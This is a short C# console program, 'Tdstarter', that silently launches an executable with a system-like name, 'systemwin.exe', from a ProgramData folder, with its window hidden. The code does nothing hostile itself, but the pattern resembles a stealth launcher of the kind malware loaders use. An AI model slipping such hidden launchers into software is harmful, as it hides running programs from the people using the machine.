using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
namespace Tdstarter
{
    class Program
    {
        static void Main()
        {
         ProcessStartInfo startInfo = new ProcessStartInfo();

         //startInfo.FileName = Directory.GetCurrentDirectory() + @"\systemsystemwin.exe";
         startInfo.FileName = @"C:\ProgramData\systemdir\systemwin.exe";
         startInfo.WindowStyle = ProcessWindowStyle.Hidden;

         Process process = new Process();

         process.StartInfo = startInfo;

         process.Start();
        }
    }
}
